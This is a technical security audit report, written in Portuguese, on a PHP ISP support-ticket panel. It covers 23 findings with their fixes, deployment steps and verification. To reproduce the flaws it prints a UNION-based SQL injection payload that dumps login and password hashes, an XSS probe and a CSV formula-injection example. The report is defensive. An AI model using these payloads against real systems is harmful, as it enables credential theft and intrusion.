# Relatório técnico — LEB-100-A · Painel de Chamados (NetX ISP)

Números de linha referem-se sempre aos arquivos **originais** do pacote.

## 1. Resumo

O painel funciona, mas não aplicava a própria regra de negócio nem tratava a entrada como hostil. Qualquer cliente logado lia chamados de outros clientes por três caminhos (listagem, detalhe e CSV) e, pela busca, extraía a tabela de usuários com os hashes de senha (injeção de SQL) — hashes MD5 sem sal. Havia ainda XSS refletido na busca, segredos de produção gravados em `config.php`, fixação de sessão, uma divisão por zero que derruba a listagem e uma consulta por linha (N+1) na listagem e no export.

São 23 achados: 19 corrigidos no código entregue e 4 apenas reportados (o motivo está em cada um). As 7 funções públicas mantêm assinatura e retorno, as rotas e o HTML não mudaram, e o CSV sai byte a byte igual para os dados de teste. Para técnico e para visitante anônimo, as respostas HTTP são idênticas às do código original; para cliente, a única diferença é deixar de ver o que pertence a outro cliente.

### Antes de publicar

Três passos fora do código, sem os quais o deploy quebra ou fica incompleto:

1. **Definir `DB_PASS` e `SMTP_API_KEY` no ambiente do servidor.** O código não traz mais esses valores (F6). Sem `DB_PASS` o painel responde "Falha ao conectar ao banco.". As duas credenciais antigas precisam ser trocadas, porque já estiveram no código-fonte.
2. **Rodar `ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL;`** para ativar a migração de senhas (F7). Sem o `ALTER` nada quebra: o login continua validando contra o MD5 atual. Antes de rodar, confirmar que nenhum outro script compara `usuarios.senha` com `MD5()` por conta própria.
3. **Apagar `/var/www/painel/tmp/chamados.csv`**, deixado pelo export antigo (F9). O painel não grava mais esse arquivo; um script que o lesse dali precisa passar a chamar `exportarCsv()`.

### Arquivos alterados

| Arquivo | Mudança |
| --- | --- |
| `code/lib.php` | consultas parametrizadas, JOIN no lugar do N+1, variantes internas com filtro de dono, verificação de senha em dois formatos, export direto na saída |
| `code/index.php` | aplica a regra de visibilidade nas três rotas, escapa a busca, endurece sessão e tratamento de erro, valida tipo dos parâmetros |
| `code/config.php` | segredos só por variável de ambiente |
| `code/schema.sql` | coluna `usuarios.senha` passa a `VARCHAR(255)` (uma linha) |
| `code/seed.sql` | intacto |

## 2. Achados, em ordem de prioridade

| ID | Achado | Onde | Categoria | Severidade | Confiança | Corrigido |
| --- | --- | --- | --- | --- | --- | --- |
| F1 | Injeção de SQL na busca | `lib.php:80-85` | segurança | crítica | 99 | sim |
| F2 | Detalhe do chamado sem checagem de dono | `index.php:52-58` | segurança | alta | 97 | sim |
| F3 | Listagem mostra chamados de todos os clientes | `index.php:72-73` | segurança | alta | 95 | sim |
| F4 | Export CSV entrega todos os chamados a qualquer usuário | `index.php:44-47` | segurança | alta | 95 | sim |
| F5 | XSS refletido no termo de busca | `index.php:79-83` | segurança | alta | 99 | sim |
| F6 | Segredos de produção no código-fonte | `config.php:12-15` | segurança | alta | 95 | sim |
| F7 | Senhas em MD5 sem sal | `lib.php:15-16` | segurança | alta | 97 | sim |
| F8 | Export usa um único arquivo compartilhado (corrida) | `lib.php:125-126` | bug | média | 85 | sim |
| F9 | Cópia do CSV completo fica sob o diretório do painel | `config.php:18` | segurança | média | 55 | sim |
| F10 | Fixação de sessão e cookie sem proteção | `index.php:15-25` | segurança | média | 85 | sim |
| F11 | Divisão por zero em `mediaResposta` | `lib.php:116` | bug | média | 97 | sim |
| F12 | Uma consulta por chamado para buscar o técnico (N+1) | `lib.php:64-93` | performance | média | 97 | sim |
| F13 | Injeção de fórmula no CSV | `lib.php:138-144` | segurança | média | 65 | sim |
| F14 | Erros de banco sem tratamento coerente | `index.php:9-12` | bug | baixa | 75 | sim |
| F15 | Export falha em silêncio | `lib.php:127-135` | bug | baixa | 85 | sim |
| F16 | Parâmetro em forma de array derruba a página | `index.php:21-22` | bug | baixa | 90 | sim |
| F17 | Login sem limite de tentativas | `index.php:20-29` | segurança | média | 75 | não |
| F18 | Média calculada linha a linha no PHP | `lib.php:109-115` | performance | baixa | 90 | sim |
| F19 | Listagem carrega a tabela inteira | `lib.php:80-92` | performance | média | 80 | não |
| F20 | `fputcsv` sem o parâmetro `$escape` | `lib.php:130` | qualidade | baixa | 50 | sim |
| F21 | Status desconhecido aparece como "Resolvido" | `lib.php:32-34` | bug | baixa | 55 | não |
| F22 | `rotuloPrioridade` com quatro níveis de `if` e números soltos | `lib.php:40-59` | qualidade | baixa | 70 | sim |
| F23 | Entrada web e biblioteca misturam responsabilidades | `index.php:9-97` | arquitetura | média | 80 | não |

F2, F3 e F4 têm a mesma causa — a regra de visibilidade não existia em nenhum ponto do código; `$uid` e `$papel` eram lidos em `index.php:38-39` e nunca usados — mas são três portas distintas, cada uma explorável sozinha, por isso estão separadas.

---

### F1 — Injeção de SQL na busca

`code/lib.php:80-85` (entrada em `code/index.php:72-73`) · segurança · **crítica** · confiança **99** · corrigido

**Mecanismo.** `listarChamados()` monta `" WHERE titulo LIKE '%" . $busca . "%'"` (linha 82), e `$busca` é `$_GET['busca']` sem nenhum tratamento. Um apóstrofo fecha o literal e o resto do termo vira SQL. Reproduzi logado como a cliente `ana`: `busca=zzz' UNION SELECT id,id,NULL,CONCAT(login,':',senha),'',1,1,NULL,NOW() FROM usuarios -- ` devolveu, na coluna Titulo da listagem, `login:hash` dos quatro usuários. Uma busca legítima por `d'agua` respondia erro 500.

**Impacto.** Qualquer conta autenticada, inclusive de cliente, lê tudo o que o usuário de banco `painel` alcança: todos os chamados e a tabela `usuarios`. Como os hashes são MD5 (F7), isso equivale a obter a senha dos técnicos. `mysqli::query()` não executa comandos empilhados, então o caminho é de leitura; ainda assim é o achado mais grave.

**O que fiz.** A consulta passou a ser parametrizada (`LIKE ?`, com `'%' . $busca . '%'` como parâmetro, via `consultaPreparada()`). O mesmo payload agora devolve lista vazia e `d'agua` responde 200.

### F2 — Detalhe do chamado sem checagem de dono

`code/index.php:52-58` (consulta em `code/lib.php:98-102`) · segurança · **alta** · confiança **97** · corrigido

**Mecanismo.** A rota `?ver=<id>` chama `verChamado($db, (int) $_GET['ver'])` e imprime o que voltar. A consulta é `WHERE id = <id>`, sem dono, e os ids são sequenciais (`AUTO_INCREMENT`). Reproduzi: `ana` abre `?ver=103`, chamado do `bruno`, e lê título e descrição.

**Impacto.** Um cliente lê qualquer chamado do ISP trocando o número na URL. É violação direta da regra de visibilidade do manifesto.

**O que fiz.** `index.php` calcula `$donoId = escopoVisibilidade($uid, $papel)` — `null` para técnico, o próprio id para qualquer outro papel — e chama `verChamadoVisivel($db, $id, $donoId)`, que acrescenta `AND usuario_id = ?` quando há dono. Chamado alheio responde o mesmo "Chamado nao encontrado." de um id inexistente, para não confirmar que o id existe. Técnico continua abrindo qualquer chamado. `verChamado()` público não mudou (ver D1).

### F3 — Listagem mostra chamados de todos os clientes

`code/index.php:72-73` (consulta em `code/lib.php:80`) · segurança · **alta** · confiança **95** · corrigido

**Mecanismo.** A listagem chama `listarChamados($db, $busca)`, cujo SQL é `SELECT * FROM chamados` sem filtro de dono, e imprime tudo para quem estiver logado. Logada como `ana`, a página lista os 5 chamados do seed, incluindo 103 e 104, que são do `bruno`.

**Impacto.** Todo cliente vê a fila inteira do ISP — título, status, prioridade e técnico dos chamados alheios — e recebe os ids para usar em F2.

**O que fiz.** `index.php` chama `listarChamadosVisiveis($db, $busca, $donoId)`, que acrescenta `c.usuario_id = ?` para cliente. O filtro vale também para a busca. Para técnico a resposta é byte a byte igual à original.

### F4 — Export CSV entrega todos os chamados a qualquer usuário

`code/index.php:44-47` (consulta em `code/lib.php:132`) · segurança · **alta** · confiança **95** · corrigido

**Mecanismo.** `?export=csv` chama `exportarCsv($db)` para qualquer sessão, e a consulta é `SELECT * FROM chamados ORDER BY id`. Logado como `bruno`, o download trouxe os 5 chamados.

**Impacto.** Uma única requisição entrega a base de chamados em lote (id, título, status, técnico, data).

**O que fiz.** A rota chama `exportarCsvVisivel($db, $donoId)`: o cliente recebe o CSV só com os chamados dele, com o mesmo cabeçalho, formato e ordenação; o técnico recebe todos. Não bloqueei a rota para cliente: ele tem direito a ver os próprios chamados e a rota faz parte do contrato. `exportarCsv($db)` continua exportando tudo para as rotinas internas.

### F5 — XSS refletido no termo de busca

`code/index.php:79-83` · segurança · **alta** · confiança **99** · corrigido

**Mecanismo.** `$busca` é concatenado sem escape dentro do atributo `value="…"` (linha 79) e dentro de `<p>Resultados para: …</p>` (linha 82). Com `?busca="><script>alert(1)</script>` o HTML devolvido contém a tag `<script>` intacta nos dois pontos.

**Impacto.** Um link enviado a um técnico logado executa script na origem do painel: lê qualquer chamado em nome dele e, como o cookie de sessão não tinha `HttpOnly` (F10), leva a sessão.

**O que fiz.** `htmlspecialchars($busca, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` nos dois pontos. Para texto comum o HTML gerado é idêntico ao anterior.

### F6 — Segredos de produção no código-fonte

`code/config.php:12-15` · segurança · **alta** · confiança **95** · corrigido (falta a rotação)

**Mecanismo.** A linha 12 traz a senha de produção do banco como valor de reserva de `getenv('DB_PASS')`; a linha 15 traz a chave da central de e-mail como literal, sem alternativa por ambiente. Quem lê o repositório, um backup ou o pacote de deploy tem as duas. O valor de reserva ainda esconde erro de configuração: sem a variável, o sistema sobe com a senha embutida e ninguém percebe.

**Impacto.** Acesso direto ao banco com o usuário do painel e envio de e-mail em nome do ISP.

**O que fiz.** As duas constantes continuam existindo — outros scripts podem usá-las — mas são lidas só do ambiente, sem valor de reserva. Tirar do código não desfaz a exposição: as duas credenciais precisam ser trocadas (passo 1 de "Antes de publicar").

### F7 — Senhas em MD5 sem sal

`code/lib.php:15-16` (coluna em `code/schema.sql:7`) · segurança · **alta** · confiança **97** · corrigido (ativa com o `ALTER`)

**Mecanismo.** `autenticar()` calcula `md5($senha)` e compara no SQL; a coluna é `CHAR(32)`. MD5 é rápido e não tem sal: senhas iguais geram hashes iguais (no seed, `ana` e `bruno` têm o mesmo valor) e a quebra por tabela ou força bruta leva segundos. Com F1, esses hashes estavam ao alcance de qualquer cliente.

**Impacto.** Vazamento do banco, por qualquer caminho, equivale a vazamento das senhas.

**O que fiz.** `autenticar()` busca o usuário pelo login e confere a senha no PHP. Valor guardado com 32 dígitos hexadecimais é tratado como MD5 legado (`hash_equals`, sem distinguir maiúsculas, como o SQL fazia); qualquer outro vai para `password_verify()`. Depois de um login legado válido, `migrarSenhaLegada()` regrava a senha com `password_hash()`.

A regravação só acontece se a coluna comportar o hash novo (consulta a `information_schema`). No `CHAR(32)` original, um hash bcrypt de 60 caracteres seria truncado ou rejeitado e o usuário ficaria trancado para fora; por isso o código funciona nos dois schemas e a migração começa quando o `ALTER` for aplicado. `schema.sql` já traz `VARCHAR(255)`.

Testei os dois cenários. Com `CHAR(32)`, o login funciona e os hashes ficam intactos. Com `VARCHAR(255)`, o hash vira `$2y$…` no primeiro login e os logins seguintes aceitam a senha certa e recusam a errada. Se o usuário do banco não tiver `UPDATE`, o login funciona e a falha vai só para o log.

**Limites.** Conta que nunca mais logar continua em MD5. Um script externo que compare `senha` com `MD5()` deixa de reconhecer usuários migrados — por isso a ativação é um passo deliberado, não automático.

### F8 — Export usa um único arquivo compartilhado

`code/lib.php:125-126` (leitura na linha 150) · bug · **média** · confiança **85** · corrigido

**Mecanismo.** Todo export grava no mesmo caminho, `EXPORT_DIR/chamados.csv`, com `fopen(…, 'w')`, e depois o devolve com `readfile()`. Não há trava nem nome único. Em dois exports simultâneos, o segundo `fopen('w')` trunca o arquivo que o primeiro ainda está escrevendo ou prestes a ler. A rotina noturna, ao chamar `exportarCsv()`, disputa o mesmo arquivo com os usuários web.

**Impacto.** CSV truncado ou misturado, de forma intermitente e sem erro. O defeito também impedia corrigir F4: com conteúdo por usuário, o arquivo compartilhado entregaria o export de um usuário a outro.

**O que fiz.** O CSV é escrito direto na saída (`php://output`), sem arquivo intermediário. Os bytes enviados são os mesmos. Não reproduzi a corrida com carga concorrente; a conclusão vem da leitura do código.

### F9 — Cópia do CSV completo fica sob o diretório do painel

`code/config.php:18` (uso em `code/lib.php:125-150`) · segurança · **média** · confiança **55** · corrigido (falta apagar o arquivo antigo)

**Mecanismo.** O arquivo do último export nunca é removido e permanece em `/var/www/painel/tmp/chamados.csv` com todos os chamados. Pelo nome, `/var/www/painel` é o diretório do próprio painel. Se ele for a raiz servida pelo servidor web, `GET /tmp/chamados.csv` devolve o arquivo sem login. Não tenho a configuração do servidor para confirmar; daí a confiança 55.

**Impacto.** Download anônimo da base de chamados, atualizada a cada export.

**O que fiz.** O painel não grava mais o arquivo (mesma mudança de F8). A constante `EXPORT_DIR` foi mantida para os demais scripts. O arquivo que já está no servidor precisa ser apagado à mão.

### F10 — Fixação de sessão e cookie sem proteção

`code/index.php:15-25` · segurança · **média** · confiança **85** · corrigido

**Mecanismo.** `session_start()` (linha 15) roda com os padrões do PHP: cookie sem `HttpOnly` nem `SameSite`, e aceitação de ids que o servidor não gerou. O login (linhas 24-25) grava `uid` e `papel` na sessão que chegou, sem trocar o id. Reproduzi: enviei `PHPSESSID=fixado…` no POST de login, a resposta não trouxe cookie novo e aquele id passou a estar autenticado.

**Impacto.** Quem consegue plantar um id de sessão no navegador da vítima (por F5, por um subdomínio vizinho ou em rede sem HTTPS) entra como ela depois do login. Sem `HttpOnly`, qualquer XSS lê o cookie.

**O que fiz.** `session_regenerate_id(true)` no login; `session.use_strict_mode`, `cookie_httponly` e `cookie_samesite=Lax` antes de `session_start()`; `cookie_secure` quando a requisição já é HTTPS. Usei `Lax` e não `Strict` porque há links e favoritos externos: com `Strict`, quem chegasse por um deles apareceria deslogado. Conferi: o login emite id novo, o id plantado deixa de valer e o cookie sai com `HttpOnly; SameSite=Lax`.

### F11 — Divisão por zero em `mediaResposta`

`code/lib.php:116` · bug · **média** · confiança **97** · corrigido

**Mecanismo.** `return $soma / $qtd;`, onde `$qtd` é o número de chamados com `minutos_resposta` preenchido. Se não houver nenhum — base nova, ou todos aguardando resposta — `$qtd` é 0. No PHP 8 isso lança `DivisionByZeroError`, e `mediaResposta()` é chamada em toda listagem (`index.php:74`). Reproduzi: com todos os `minutos_resposta` nulos, a listagem morre em "Uncaught DivisionByZeroError … lib.php:116". No PHP 7 a mesma linha devolveria `NAN` com um aviso (não testei).

**Impacto.** A página principal fica fora do ar para todos enquanto não houver chamado respondido.

**O que fiz.** Sem chamado respondido a função devolve `0.0` e o painel mostra "0 min".

### F12 — Uma consulta por chamado para buscar o técnico (N+1)

`code/lib.php:64-93` (o mesmo padrão nas linhas 136-137) · performance · **média** · confiança **97** · corrigido

**Mecanismo.** `listarChamados()` chama `tecnicoNome()` para cada linha (linha 89), e cada chamada executa `SELECT nome FROM usuarios WHERE id = …` (linha 69). `exportarCsv()` repete o padrão (linha 137). Medi com o log de consultas do banco: a listagem dos 5 chamados do seed fazia 6 consultas e o export, 5.

**Impacto.** O número de idas ao banco cresce com o número de chamados. Numa base que acumula desde 2013, cada abertura do painel e cada export fazem milhares de consultas.

**O que fiz.** `LEFT JOIN usuarios` na consulta da listagem e na do export. `tecnico_nome` continua vindo com `'-'` quando não há técnico. A listagem passou a 2 consultas e o export a 1, qualquer que seja o tamanho da base. `tecnicoNome()` foi mantida (D12).

### F13 — Injeção de fórmula no CSV

`code/lib.php:138-144` · segurança · **média** · confiança **65** · corrigido

**Mecanismo.** O título do chamado, escrito pelo cliente, vai para o CSV como está. `fputcsv` trata aspas e vírgulas, não o conteúdo: um título que começa com `=`, `+`, `-` ou `@` é avaliado como fórmula quando o arquivo é aberto em Excel ou LibreOffice. Exemplo: `=HYPERLINK("http://…?"&A1,"clique")`.

**Impacto.** Um cliente planta uma fórmula que roda na máquina do técnico que abrir o export: envio de dados da planilha por link e, em configurações antigas do Excel, execução de comando. Depende de alguém abrir o CSV em planilha e de o cadastro de chamados (que não está neste pacote) aceitar esses títulos; daí a confiança 65.

**O que fiz.** `csvTextoSeguro()` põe um apóstrofo na frente do título e do nome do técnico quando começam com um desses caracteres (ou TAB/CR). **É o único ponto em que o conteúdo de uma célula do CSV muda**: `-50% de velocidade` sai como `'-50% de velocidade`. Cabeçalho, colunas, ordenação e rótulos de status não mudam, e o `-` da coluna Tecnico sem técnico continua `-`. Se um consumidor automático precisar do título cru, basta remover a chamada em `exportarCsvVisivel()`.

### F14 — Erros de banco sem tratamento coerente

`code/index.php:9-12` (e `code/lib.php:70, 88, 101, 112`) · bug · **baixa** · confiança **75** · corrigido

**Mecanismo.** O código testa `$db->connect_errno` depois de `new mysqli(…)`. Desde o PHP 8.1 o mysqli lança exceção por padrão: a falha de conexão estoura na linha 9 e as linhas 10-12 nunca rodam. Reproduzi no PHP 8.4 com senha errada e `display_errors` ligado: em vez de "Falha ao conectar ao banco." a página mostra "Uncaught mysqli_sql_exception: Access denied for user 'painel'@'localhost' … in …/index.php:9". No modo anterior ao 8.1 o problema é o inverso: `$db->query()` devolve `false` e a biblioteca chama `->fetch_assoc()` sobre ele, o que dá erro fatal.

**Impacto.** Falha de banco aparece como erro fatal com usuário, host e caminho do servidor quando `display_errors` está ligado, e como página em branco quando não está. É baixa porque depende de o banco falhar e da configuração do PHP.

**O que fiz.** `mysqli_report()` explícito, para o comportamento ser o mesmo em qualquer versão; conexão em `try/catch` com a mesma mensagem de antes; `set_exception_handler` que registra no log e responde "Erro interno." com 500. Na biblioteca, `consultaPreparada()` lança exceção nos dois modos do mysqli.

### F15 — Export falha em silêncio

`code/lib.php:127-135` · bug · **baixa** · confiança **85** · corrigido

**Mecanismo.** Se o `fopen` falha (linhas 127-129) ou a consulta falha (linhas 133-135), a função só dá `return`, e `index.php:45-46` encerra em seguida: resposta 200 com corpo vazio. No segundo caso o arquivo não é fechado e o arquivo compartilhado fica truncado, só com o cabeçalho.

**Impacto.** O usuário baixa um arquivo vazio sem explicação, e a rotina noturna recebe um export vazio que não se distingue de "não há chamados".

**O que fiz.** A consulta roda antes de qualquer saída e a falha vira exceção: mensagem genérica e 500 na web (F14), erro visível para o script que chamou. Exercitei o caminho de exceção de `consultaPreparada()` com uma consulta contra tabela inexistente; não forcei falha de `fopen`.

### F16 — Parâmetro em forma de array derruba a página

`code/index.php:21-22` (e 72-73, 53) · bug · **baixa** · confiança **90** · corrigido

**Mecanismo.** O PHP transforma `login[]=x` e `busca[]=x` em arrays. A linha 22 passa `$_POST['login']` para `autenticar(…, string $usuario, …)` e a linha 73 passa `$busca` para `listarChamados(…, string $busca)`, o que lança `TypeError` não tratado. Reproduzi os dois. `?ver[]=x` não quebra, mas `(int)` de um array não vazio é 1, então a rota tenta abrir o chamado 1.

**Impacto.** Qualquer visitante — a tela de login não exige sessão — provoca erro 500 e, com `display_errors` ligado, exposição de caminhos.

**O que fiz.** Parâmetro que não é string é tratado como ausente nas três rotas e no login.

### F17 — Login sem limite de tentativas

`code/index.php:20-29` · segurança · **média** · confiança **75** · **não corrigido**

**Mecanismo.** Cada POST de login chama `autenticar()` sem contador, atraso ou bloqueio, por conta ou por IP.

**Impacto.** Adivinhação de senha online limitada só pela rede.

**Por que não corrigi.** Contar tentativas exige estado compartilhado entre requisições — uma tabela nova ou um cache — e isso é schema ou dependência nova, além de evoluir o código. O bcrypt de F7 encarece cada tentativa contra conta já migrada, mas não é controle de acesso. Proponho limitar no servidor web agora (por exemplo `limit_req` no nginx ou fail2ban) e criar uma tabela de tentativas depois.

### F18 — Média calculada linha a linha no PHP

`code/lib.php:109-115` · performance · **baixa** · confiança **90** · corrigido

**Mecanismo.** A função traz uma linha por chamado respondido e soma num laço PHP, a cada exibição da listagem.

**Impacto.** Transferência proporcional ao histórico inteiro para produzir um número.

**O que fiz.** `SELECT SUM(minutos_resposta), COUNT(minutos_resposta)`. A divisão ficou no PHP de propósito: `AVG()` devolve decimal com 4 casas (`25.6667`), e a função hoje devolve `25.666666666666668`; com soma e contagem o valor retornado é idêntico ao anterior.

### F19 — Listagem carrega a tabela inteira

`code/lib.php:80-92` · performance · **média** · confiança **80** · **não corrigido**

**Mecanismo.** `SELECT *` sem `LIMIT`: cada abertura do painel traz todos os chamados, com a coluna `descricao` (`TEXT`) que a listagem nem exibe, monta tudo em memória e gera uma única tabela HTML.

**Impacto.** Tempo e memória crescem com o histórico, sem teto.

**Por que não corrigi.** Paginar muda o que `index.php` mostra e o que `listarChamados()` devolve, e os consumidores externos percorrem a lista inteira. Tirar `descricao` do `SELECT` removeria uma chave dos itens de uma função pública. O que melhorou de passagem: a consulta do cliente filtra por `usuario_id`, que tem índice, e o N+1 saiu (F12). Paginação precisa ser combinada com quem consome a listagem.

### F20 — `fputcsv` sem o parâmetro `$escape`

`code/lib.php:130` (e 138-144) · qualidade · **baixa** · confiança **50** · corrigido

**Mecanismo.** No PHP 8.4, `fputcsv()` sem `$escape` emite aviso de depreciação a cada chamada, porque o valor padrão vai mudar em versão futura — e com ele a escrita de campos que contêm barra invertida. Reproduzi no 8.4.26: com `error_reporting=E_ALL` e `display_errors` ligado, o arquivo baixado começa com blocos HTML de aviso, um por linha do CSV. Com a configuração de produção usual (depreciações fora do relatório de erros) nada aparece; daí baixa e 50.

**Impacto.** CSV corrompido em ambiente com avisos ligados, e mudança silenciosa de formato numa atualização futura do PHP.

**O que fiz.** Passei `',', '"', '\\'` explicitamente — os valores que já eram usados por omissão. A saída é idêntica.

### F21 — Status desconhecido aparece como "Resolvido"

`code/lib.php:32-34` · bug · **baixa** · confiança **55** · **não corrigido**

**Mecanismo.** O `else` final de `formatarStatus()` devolve "Resolvido" para qualquer valor que não seja 1 ou 2: 0, 4, negativo. A coluna é `TINYINT` sem restrição.

**Impacto.** Um status novo ou um dado sujo aparece como resolvido na listagem, no CSV e no relatório gerencial, que casa por esses textos.

**Por que não corrigi.** O manifesto fixa os três rótulos e avisa que o relatório gerencial casa por eles. Um quarto rótulo ou uma exceção para valores fora de 1–3 seria um valor de contrato novo, que os consumidores não conhecem. O schema só documenta 1–3, então hoje o defeito é latente. Proponho uma `CHECK (status IN (1,2,3))` no banco, ou combinar um rótulo com os consumidores.

### F22 — `rotuloPrioridade` com quatro níveis de `if` e números soltos

`code/lib.php:40-59` · qualidade · **baixa** · confiança **70** · corrigido

**Mecanismo.** A regra de SLA está em quatro `if` aninhados, com os limites 3, 4 e 30 espalhados e sem nome. Para saber o que sai para "prioridade 4, 20 minutos" é preciso percorrer a árvore inteira.

**Impacto.** Custo e risco de manutenção numa regra de negócio que aparece na listagem e no detalhe.

**O que fiz.** Reescrevi como retornos antecipados, com os limites comentados, sem criar constantes globais novas (a biblioteca é incluída por outros scripts e um nome novo poderia colidir). Comparei a saída com a da função original para prioridade de −1 a 6 e minutos em `null, −1, 0, 1, 29, 30, 31, 40, 1000`: idêntica nos 72 casos. Os rótulos em si não mudei (D7).

### F23 — Entrada web e biblioteca misturam responsabilidades

`code/index.php:9-97` (e `code/lib.php:123-151`) · arquitetura · **média** · confiança **80** · **não corrigido**

**Mecanismo.** `index.php` é um roteiro único que abre a conexão, cuida da sessão, autentica, roteia, consulta e monta HTML com `echo`. `lib.php` mistura acesso a dados, regra de negócio e HTTP: `exportarCsv()` consulta, formata, envia cabeçalhos e escreve na saída. Não havia um lugar para a autorização — é a causa de F2, F3 e F4.

**Impacto.** Cada rota nova precisa lembrar sozinha de autenticar, autorizar e escapar; não há como testar regra de negócio sem banco e sem HTTP.

**Por que não corrigi.** Separar em camadas é a reescrita que a tarefa proíbe, e as assinaturas públicas amarram a biblioteca a funções soltas sobre `mysqli`. Fiz só o que as correções exigiam: a regra de visibilidade em uma função (`escopoVisibilidade`), aplicada no SQL pelas três variantes `…Visivel`, e um único ponto de execução de consultas (`consultaPreparada`).

## 3. Decisões — o que não mudei e por quê

**D1 — Assinaturas públicas intactas; a regra de visibilidade ficou fora delas.** `listarChamados`, `verChamado` e `exportarCsv` não recebem o usuário, e a rotina noturna e o relatório gerencial as chamam sem ninguém logado, esperando todos os chamados. Não acrescentei parâmetro opcional: seria compatível na chamada, mas o manifesto fixa "nome, parâmetros, tipos". O filtro ficou em funções internas novas (`listarChamadosVisiveis`, `verChamadoVisivel`, `exportarCsvVisivel`), usadas por `index.php`. Consequência a conhecer: as funções públicas continuam devolvendo tudo e são para chamadores internos; uma entrada web nova deve usar as variantes `…Visivel`.

**D2 — Formato das linhas devolvidas.** Consulta preparada devolve inteiros nativos; `$db->query()` devolvia tudo como string (`'id' => '101'`). Converti de volta (`linhaComoTexto`), porque um consumidor que compare com `===` ou serialize em JSON veria a diferença. Conferi com `var_export`: valores e tipos idênticos aos do original.

**D3 — Bytes do CSV.** Mantive `fputcsv` com os mesmos parâmetros e quebra de linha `\n`. Por isso o cabeçalho continua saindo como sempre saiu, `ID,Titulo,Status,Tecnico,"Aberto em"` — o `fputcsv` põe aspas em campo com espaço. Lido por um parser de CSV é o cabeçalho do manifesto; escrever a linha à mão, sem aspas, mudaria os bytes que os consumidores recebem hoje. A única mudança de conteúdo é a de F13.

**D4 — `%` e `_` na busca continuam sendo curingas.** O termo vai para o `LIKE` sem escapar esses dois caracteres, como antes: buscar `%` lista tudo. Busca literal seria mais correta, mas mudaria o resultado de buscas existentes, inclusive links salvos, e a injeção se resolve sem isso.

**D5 — A média do topo continua global também para cliente.** `mediaResposta($db)` não recebe usuário e é um indicador agregado de SLA, não um chamado. Restringi-la mudaria o número exibido e faria um cliente sem chamados respondidos ver "0 min". Se o ISP entender que o agregado não deve aparecer para cliente, é decisão de produto.

**D6 — `formatarStatus` para valores fora de 1–3.** Ver F21.

**D7 — Rótulos de `rotuloPrioridade`.** Mantive todos, inclusive dois que parecem estranhos: chamado crítico respondido dentro do SLA sai como "Alto - dentro do SLA", e crítico ainda sem resposta sai como "Aguardando 1a resposta". São textos que consumidores podem casar e a função só recebe o tempo da primeira resposta; mudar é decisão de negócio.

**D8 — Mensagens e códigos HTTP.** "Chamado nao encontrado." e "Falha ao conectar ao banco." continuam respondendo 200, e login errado continua voltando ao formulário sem mensagem. 404 e 503 seriam mais corretos, mas monitoramento e scripts podem depender do que há hoje, e nenhum achado exigia a troca.

**D9 — Paginação e `SELECT c.*`.** Ver F19.

**D10 — Funcionalidades de segurança que não existiam.** Não adicionei limite de tentativas (F17), logout, token anti-CSRF no formulário de login, nem cabeçalhos como CSP e `X-Frame-Options`. São rotas, estado ou comportamento novos; `X-Frame-Options`, por exemplo, quebraria um portal interno que embuta o painel. Recomendo tratá-los como próxima etapa.

**D11 — `papel` continua guardado na sessão no momento do login.** Um técnico rebaixado mantém o acesso até a sessão expirar. Corrigir exige reler o usuário a cada requisição e definir o que fazer com sessões de usuários removidos; faz sentido junto com logout e expiração de sessão.

**D12 — `tecnicoNome()` e `EXPORT_DIR` mantidos.** Nenhum dos dois é mais usado pelo painel, mas `lib.php` e `config.php` são incluídos por outros scripts. Remover um nome que alguém chama custa uma quebra; mantê-lo não custa nada.

**D13 — Separação de camadas.** Ver F23.

**D14 — Banco e arquivos do pacote.** `seed.sql` está intacto e em `schema.sql` mudei só a coluna `senha`; não criei índices. `schema.sql` e `seed.sql` ficam ao lado de `index.php`; se esse diretório for a raiz web, são baixáveis. Não posso movê-los (restrição 3); recomendo bloquear `*.sql` no servidor web.

**D15 — Versão do PHP.** Não sei qual PHP roda em produção. Não usei nada além do que o original já exigia (PHP 7.1); `session.cookie_samesite` só tem efeito a partir do 7.3 e é ignorado antes.

## 4. Como verifiquei

Ambiente: PHP 8.4.26 e um MariaDB 11.8.6 local e descartável, carregado com `schema.sql` + `seed.sql`.

- **Funções públicas.** Chamei as 7 funções no código original e no novo com as mesmas entradas — logins válidos e inválidos, status de −1 a 6, a grade de `rotuloPrioridade`, dez termos de busca incluindo `%` e `_`, ids existentes e inexistentes, a média e o CSV completo — e comparei o `var_export` (valores e tipos) e as assinaturas por reflexão. Resultado idêntico, com o schema original e com o novo.
- **HTTP.** 55 requisições em cada versão: anônimo, login errado e, para os quatro usuários, login, listagem, três buscas, sete detalhes e o export. Comparei corpo, código HTTP e cabeçalhos `Content-Type`, `Content-Disposition` e `Location`. Técnicos e anônimo: idêntico. Clientes: diferem 11 respostas, todas casos em que o cliente via chamado de outro (F2, F3, F4).
- **Achados.** Reproduzi no código original e conferi no novo: F1, F2, F3, F4, F5, F7, F10, F11, F12, F13, F14, F16 e F20. As rotas do código novo não emitem nenhum aviso com `error_reporting=E_ALL`.

O que **não** foi verificado: MySQL 8 propriamente dito (o banco de teste foi MariaDB); PHP anterior ao 8.4; a corrida de F8 sob carga concorrente; o comportamento de F9 no servidor web real; e o deploy em produção, incluindo os três passos de "Antes de publicar".
